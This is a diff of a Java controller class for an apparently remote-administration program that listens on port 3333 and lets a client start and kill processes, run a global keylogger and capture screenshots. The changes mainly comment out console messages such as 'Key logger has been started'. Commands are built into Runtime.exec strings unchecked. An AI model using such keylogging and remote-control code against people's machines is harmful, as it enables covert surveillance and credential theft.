@@ -10,21 +10,15 @@ import org.jnativehook.GlobalScreen;
 import org.jnativehook.NativeHookException;
 
 import javax.imageio.ImageIO;
-import javax.swing.*;
 import java.awt.*;
 import java.awt.image.BufferedImage;
 import java.io.*;
 import java.net.ServerSocket;
 import java.net.Socket;
 import java.nio.ByteBuffer;
-import java.nio.charset.StandardCharsets;
-import java.nio.file.Path;
-import java.nio.file.Paths;
-import java.security.Key;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.Optional;
-import java.util.Random;
 
 
 public class Controller {
@@ -40,12 +34,12 @@ public class Controller {
         dout = new DataOutputStream(clientConnect.getOutputStream());
         dout.writeUTF("OK");
         dout.flush();
-        System.out.println("connected");
+        //System.out.println("connected");
         line = "";
         while (!line.equals("stop")) {
             line = din.readUTF();
             String[] x=line.split("/");
-            System.out.println("client says:" + line);
+            //System.out.println("client says:" + line);
             if (line.equals("stop")) {
                 break;
             }
@@ -105,7 +99,7 @@ public class Controller {
                 keyloggerView();
             }
             else if (x[0].equals("CaptureScreen")) {
-                System.out.println("CS");
+                //System.out.println("CS");
                 captureScreen();
             }
         }
@@ -123,8 +117,6 @@ public class Controller {
     public void setOpenServerButton(ActionEvent e) {
         try {
             ss = new ServerSocket(3333);
-
-
             Alert alert = new Alert(Alert.AlertType.INFORMATION);
             alert.setContentText("Server is opened !");
             alert.setTitle("Server");
@@ -137,9 +129,8 @@ public class Controller {
             }
 
         } catch (IOException ioe) {
-            ioe.printStackTrace();
             Alert alert = new Alert(Alert.AlertType.INFORMATION);
-            alert.setContentText("Cant connect with client!");
+            alert.setContentText("Client is disconnected!");
             alert.setTitle("Server");
             alert.showAndWait();
         } catch (NativeHookException ex) {
@@ -173,7 +164,8 @@ public class Controller {
             String[] parse = br.split(",");
             appName = parse[parse.length - 1];
             pid = parse[1];
-            if (!appName.equals("\"N/A\"") && check(appRunning, appName) && appName.length()>=3) {
+             //&& appName.length()>=3
+            if (!appName.equals("\"N/A\"") && check(appRunning, appName)) {
 
                 pid = pid.substring(1, pid.length()-1);
                 appName = appName.substring(1, appName.length()-1);
@@ -190,7 +182,7 @@ public class Controller {
     public void startApp(String serviceName) {
         try {
             Runtime.getRuntime().exec("cmd /c start " + serviceName + ".exe");
-            System.out.println(serviceName + " started successfully!");
+            //System.out.println(serviceName + " started successfully!");
         } catch (IOException e) {
             // TODO Auto-generated catch block
             e.printStackTrace();
@@ -205,7 +197,9 @@ public class Controller {
             BufferedReader input = new BufferedReader
                     (new InputStreamReader(p.getInputStream()));
             while ((line = input.readLine()) != null) {
-
+                if (line.equals("INFO: No tasks are running which match the specified criteria.")) {
+                    return false;
+                }
                 isValid = true;
                 String[] parse = line.split(",");
                 String processName = parse[0];
@@ -213,7 +207,7 @@ public class Controller {
 
                 try {
                     Runtime.getRuntime().exec("taskkill /IM " + processName);
-                    System.out.println(processName + " killed successfully!");
+                    //System.out.println(processName + " killed successfully!");
                 } catch (IOException e) {
                     e.printStackTrace();
                 }
@@ -267,7 +261,7 @@ public class Controller {
 
                 isValid = true;
                 Runtime.getRuntime().exec("taskkill /PID " + pid + " /F");
-                System.out.println("Process killed successfully!");
+                //System.out.println("Process killed successfully!");
             }
         } catch (IOException e) {
             isValid = false;
@@ -279,7 +273,7 @@ public class Controller {
         KeyLogger x = null;
         if (!GlobalScreen.isNativeHookRegistered() || sum==1) {
 
-            System.out.println("Key logger has been started");
+            //System.out.println("Key logger has been started");
 
             KeyLogger.init();
 
@@ -300,7 +294,7 @@ public class Controller {
     public void keyloggerUnHook() throws NativeHookException {
         if (GlobalScreen.isNativeHookRegistered()){
             GlobalScreen.unregisterNativeHook();
-            System.out.println("Key logger is stopped");
+            //System.out.println("Key logger is stopped");
         }
     }
 
